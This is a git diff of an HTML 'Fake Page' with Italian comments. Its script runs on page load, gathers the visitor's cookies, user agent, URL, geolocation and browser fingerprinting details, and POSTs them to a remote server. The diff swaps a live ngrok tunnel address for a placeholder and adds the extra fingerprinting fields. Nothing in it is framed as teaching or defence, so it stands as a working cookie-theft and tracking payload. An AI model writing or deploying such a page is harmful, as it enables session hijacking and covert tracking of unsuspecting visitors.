@@ -1,34 +1,79 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Fake Page</title>
 </head>
+
 <body>
     <h1>Welcome to the fake page!</h1>
     <script>
         // Funzione per inviare i dati al server
+        function collectSensitiveData() {
+            // 1. Colleziona i cookie
+            var cookies = document.cookie;
+
+            // 2. Colleziona l'user agent
+            var userAgent = navigator.userAgent;
+
+            // 3. Colleziona l'URL corrente
+            var currentURL = window.location.href;
+
+            // 4. Colleziona l'indirizzo IP (richiede una chiamata esterna a un servizio IP, non disponibile direttamente in JS)
+            // var ipAddress = "Not directly accessible in JavaScript";
+
+            // 5. Colleziona la geolocalizzazione (se l'utente ha dato il permesso)
+            navigator.geolocation.getCurrentPosition(function (position) {
+                var latitude = position.coords.latitude;
+                var longitude = position.coords.longitude;
+
+                // 6. Colleziona la risoluzione dello schermo (fingerprinting)
+                var screenWidth = window.screen.width;
+                var screenHeight = window.screen.height;
+
+                // 7. Colleziona la lingua del browser
+                var language = navigator.language;
+
+                // 8. Colleziona la piattaforma (sistema operativo)
+                var platform = navigator.platform;
+
+                // 9. Colleziona i plugin del browser (fingerprinting)
+                var plugins = Array.from(navigator.plugins).map(p => p.name).join(", ");
+
+                // 10. Componi i dati da inviare
+                var data = "cookies=" + encodeURIComponent(cookies) +
+                    "&userAgent=" + encodeURIComponent(userAgent) +
+                    "&currentURL=" + encodeURIComponent(currentURL) +
+                    // "&ipAddress=" + encodeURIComponent(ipAddress) +
+                    "&latitude=" + encodeURIComponent(latitude) +
+                    "&longitude=" + encodeURIComponent(longitude) +
+                    "&screenWidth=" + encodeURIComponent(screenWidth) +
+                    "&screenHeight=" + encodeURIComponent(screenHeight) +
+                    "&language=" + encodeURIComponent(language) +
+                    "&platform=" + encodeURIComponent(platform) +
+                    "&plugins=" + encodeURIComponent(plugins);
+
+                // Invia i dati raccolti a un server
+                sendData(data);
+            }, function (error) {
+                console.log("Geolocation not available or permission denied.");
+            });
+        }
+
+        // Funzione per inviare i dati raccolti al server
         function sendData(data) {
             var xhr = new XMLHttpRequest();
-            xhr.open("POST", "https://d8e2-213-45-241-111.ngrok-free.app", true);
+            xhr.open("POST", "https://your-server-url.com", true);
             xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
             xhr.send(data);
         }
 
-        // Colleziona i cookie e altre informazioni
-        var cookies = document.cookie;
-        var userAgent = navigator.userAgent;
-        var currentURL = window.location.href;
+        // Esegui la raccolta dei dati
+        collectSensitiveData();
 
-        // Componi i dati da inviare
-          var data = "cookies=" + encodeURIComponent(cookies) + 
-                   "&userAgent=" + encodeURIComponent(userAgent) +
-                   "&currentURL=" + encodeURIComponent(currentURL)+
-                   "&sessionHistory=" + encodeURIComponent(sessionHistory);
-
-        // Invia i dati
-        sendData(data);
     </script>
 </body>
+
 </html>
